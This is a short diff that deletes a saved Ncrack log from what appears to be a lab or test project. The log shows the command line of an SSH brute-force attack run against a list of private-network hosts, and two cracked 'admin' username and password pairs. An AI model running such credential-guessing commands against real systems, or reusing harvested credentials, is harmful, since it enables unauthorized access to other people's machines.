@@ -1,7 +1,0 @@
-# Ncrack 0.7 scan initiated Wed Dec  4 19:39:14 2019 as: ncrack -oN output.txt -U username.txt -P password.txt -iL ip_vulnerable.txt -p 22
-Discovered credentials for ssh on 192.168.1.40 22/tcp:
-192.168.1.40 22/tcp ssh: 'admin' 'password7'
-Discovered credentials for ssh on 192.168.1.41 22/tcp:
-192.168.1.41 22/tcp ssh: 'admin' 'password3'
-
-# Ncrack done at Wed Dec  4 19:39:53 2019 -- 5 services scanned in 39.02 seconds.
